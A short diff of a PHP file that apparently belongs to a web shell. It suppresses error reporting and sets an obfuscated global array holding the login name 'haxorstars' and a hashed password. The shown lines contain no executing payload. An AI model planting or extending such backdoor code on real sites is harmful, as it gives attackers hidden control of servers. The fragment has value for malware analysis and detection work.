@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0);
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'haxorstars',
     'password' => 'ff6d9718a96dd1c0ec471cc444adaf54',
